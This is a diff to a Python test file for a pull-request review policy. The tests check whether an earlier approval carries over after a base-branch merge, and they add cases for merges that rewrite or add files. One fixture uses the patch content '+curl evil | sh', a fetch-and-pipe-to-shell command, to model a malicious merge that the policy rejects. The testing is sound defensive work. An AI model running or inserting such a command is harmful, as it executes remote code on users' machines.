@@ -224,20 +224,25 @@ def approval(state: str = "APPROVED", sha: str = OLD, user: int = 5) -> dict[str
     }
 
 
+HELPER = {"filename": "scripts/helper.sh", "status": "modified", "patch": "+x"}
+# main's tip commit, which its full ref resolves to.
+TIP = "3" * 40
+
+
 def carried(
     head_files: list[dict[str, object]],
     *,
+    old_files: list[dict[str, object]] | None = None,
     reviews: list[dict[str, object]] | None = None,
     head_commits: list[dict[str, object]] | None = None,
-    base_change: list[dict[str, object]] = (),
     pr: dict[str, object] = CARRIED_PR,
+    reads: list[str] | None = None,
 ) -> list[str]:
     compares = {
         OLD: {
-            "files": [HELD_PATCH],
+            "files": [HELD_PATCH] if old_files is None else old_files,
             "commits": [{"sha": OLD, "parents": [{"sha": MAIN}]}],
             "total_commits": 1,
-            "merge_base_commit": {"sha": BASE},
         },
         HEAD: {
             "files": head_files,
@@ -247,56 +252,61 @@ def carried(
                 {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": MAIN}]},
             ],
             "total_commits": len(head_commits or [0, 0]),
-            "merge_base_commit": {"sha": MAIN},
         },
     }
 
     def get(endpoint: str, env: object = None) -> tuple[int | None, object]:
-        if endpoint.endswith("...main"):
+        if reads is not None:
+            reads.append(endpoint)
+        if endpoint == f"repos/{REPO}/git/ref/heads/main":
+            return 200, {"ref": "refs/heads/main", "object": {"sha": TIP}}
+        if endpoint.endswith(f"...{TIP}"):
             parent = endpoint.rsplit("/", 1)[1].split("...")[0]
-            return 200, {"status": "identical" if parent == MAIN else "diverged"}
-        if endpoint == f"repos/{REPO}/compare/{BASE}...{MAIN}":
-            return 200, {"files": list(base_change)}
+            return 200, {"status": "ahead" if parent == MAIN else "diverged"}
         sha = endpoint.rsplit("...", 1)[1]
-        assert endpoint == f"repos/{REPO}/compare/main...{sha}", endpoint
+        assert endpoint == f"repos/{REPO}/compare/{TIP}...{sha}", endpoint
         return 200, compares[sha]
 
     with mock.patch.object(policy, "_get", side_effect=get):
         return policy.carried_lifters(
-            REPO,
-            pr,
-            [approval()] if reviews is None else reviews,
-            TRUSTED,
-            (".github/actions/resolve-config/**",),
+            REPO, pr, [approval()] if reviews is None else reviews, TRUSTED
         )
 
 
 class ALiftCarriesOverABaseMerge(unittest.TestCase):
     def test_an_approval_before_a_base_merge_lifts_the_head(self) -> None:
-        self.assertEqual(carried([HELD_PATCH]), ["user5"])
-        # A file the base itself changed between the merge bases.
-        lib = {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+b"}
+        reads: list[str] = []
+        self.assertEqual(carried([HELD_PATCH], reads=reads), ["user5"])
+        # The base is read once by its full ref; every compare names its tip.
+        self.assertEqual(reads[0], f"repos/{REPO}/git/ref/heads/main")
+        self.assertIn(f"repos/{REPO}/compare/{TIP}...{OLD}", reads)
+        self.assertFalse(any("compare/main" in r or r.endswith("...main") for r in reads))
+        # A non-hold file the approved head changed, unchanged by the merge.
         self.assertEqual(
-            carried([HELD_PATCH, lib], base_change=[{"filename": lib["filename"]}]),
-            ["user5"],
+            carried([HELPER, HELD_PATCH], old_files=[HELD_PATCH, HELPER]), ["user5"]
         )
 
     def test_no_untrusted_shape_or_unread_input_carries(self) -> None:
         cases = {
             "an evil merge": {"head_files": [HELD_PATCH | {"patch": "+evil"}]},
-            # The security review of #10596.
+            # The re-review of #10596: a merge that rewrites a non-hold file
+            # the approved head changed, or adds one the base touched.
+            "a merge that rewrites scripts/helper.sh": {
+                "old_files": [HELD_PATCH, HELPER],
+                "head_files": [HELD_PATCH, HELPER | {"patch": "+curl evil | sh"}],
+            },
+            "a merge that adds a file the base touched, with its own content": {
+                "head_files": [
+                    HELD_PATCH,
+                    {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+evil"},
+                ],
+            },
             "a merge whose second parent the base does not hold": {
                 "head_files": [HELD_PATCH],
                 "head_commits": [
                     {"sha": OLD, "parents": [{"sha": MAIN}]},
                     {"sha": OTHER, "parents": [{"sha": MAIN}, {"sha": MAIN}]},
                     {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": OTHER}]},
-                ],
-            },
-            "a merge that edits a file outside H's net change": {
-                "head_files": [
-                    HELD_PATCH,
-                    {"filename": "scripts/lib.mjs", "status": "modified", "patch": "+x"},
                 ],
             },
             "a head in a fork": {
@@ -323,6 +333,13 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
             with self.subTest(name):
                 self.assertEqual(carried(**case), [])
 
+    def test_an_unresolved_base_lifts_nothing(self) -> None:
+        for answer in ((404, None), (200, {"object": {"sha": "main"}})):
+            with self.subTest(answer), mock.patch.object(policy, "_get", return_value=answer):
+                self.assertEqual(
+                    policy.carried_lifters(REPO, CARRIED_PR, [approval()], TRUSTED), []
+                )
+
     def test_a_label_removal_lifts_nothing(self) -> None:
         """The owner's decision on #10596: no issue event, push history or
         tracker config is read, so a label removal cannot lift a hold path."""
@@ -337,8 +354,8 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
             policy, "carried_lifters", return_value=["user5"]
         ) as lift:
             self.assertIsNone(held_by((DOC, FLOORED), reviews=[], humans=TRUSTED))
-        keep = lift.call_args.args[4]
-        self.assertIn(".github/actions/resolve-config/**", keep)
+        self.assertEqual(lift.call_args.args[0], REPO)
+        self.assertEqual(len(lift.call_args.args), 4)
         with mock.patch.object(policy, "carried_lifters", return_value=[]):
             self.assertIsNotNone(held_by((DOC, FLOORED), reviews=[], humans=TRUSTED))
 
